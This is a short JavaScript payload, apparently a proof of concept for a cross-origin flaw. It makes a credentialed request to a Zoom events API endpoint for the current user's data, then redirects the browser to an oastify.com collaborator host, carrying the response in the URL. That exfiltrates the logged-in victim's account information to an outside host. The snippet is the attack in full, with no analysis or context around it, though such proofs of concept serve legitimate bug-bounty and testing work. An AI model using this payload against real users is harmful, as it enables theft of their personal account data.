var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('GET','https://events.zoom.us/api/v1/e/getCurrentUser',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//xijq341cj187wnjlxsm3irl6lxrofe33.oastify.com/log?key='+this.responseText; 
};
